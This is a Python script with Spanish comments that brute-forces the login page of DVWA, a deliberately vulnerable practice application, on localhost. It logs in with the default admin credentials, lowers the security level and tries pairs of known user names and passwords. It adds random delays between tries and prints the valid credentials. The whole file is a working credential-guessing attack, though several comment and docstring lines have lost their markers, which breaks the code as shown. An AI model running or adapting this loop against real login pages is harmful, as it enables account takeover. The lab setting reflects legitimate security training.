import requests
from bs4 import BeautifulSoup
import time
import random

 Configuración
DVWA_URL = "http://localhost:8081"
LOGIN_URL = f"{DVWA_URL}/login.php"
BRUTE_URL = f"{DVWA_URL}/vulnerabilities/brute/"

# Credenciales de acceso a DVWA
DVWA_USER = "admin"
DVWA_PASS = "password"

 Lista de usuarios y contraseñas específicas de DVWA
USERS = ["admin", "gordonb", "1337", "pablo", "smithy"]
PASSWORDS = ["password", "abc123", "charley", "letmein", "sniper"]

def login_to_dvwa():
    Inicia sesión en DVWA y devuelve la sesión
    session = requests.Session()
    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'user_token'}).get('value')
    
    login_data = {
        'username': DVWA_USER,
        'password': DVWA_PASS,
        'Login': 'Login',
        'user_token': csrf_token
    }
    
    session.post(LOGIN_URL, data=login_data)
    return session

def brute_force_attack(session):
    Realiza el ataque de fuerza bruta
    session.get(f"{DVWA_URL}/security.php?security=low&seclev_submit=Submit")
    valid_credentials = []
    
    for user in USERS:
        for password in PASSWORDS:
            try:
                params = {
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                
                response = session.get(BRUTE_URL, params=params)
                
                if "Welcome to the password protected area" in response.text:
                    credential = f"{user}:{password}"
                    valid_credentials.append(credential)
                
                time.sleep(random.uniform(0.3, 1.5))
                
            except Exception as e:
                continue
    
    return valid_credentials

if __name__ == "__main__":
    dvwa_session = login_to_dvwa()
    
    if dvwa_session:
        found_credentials = brute_force_attack(dvwa_session)
        
        if found_credentials:
            print("\nCREDENCIALES VÁLIDAS ENCONTRADAS EN DVWA:")
            print("=====================================")
            for cred in found_credentials:
                print(f"• {cred}")
            print("=====================================")
        else:
            print("\nNo se encontraron credenciales válidas en DVWA")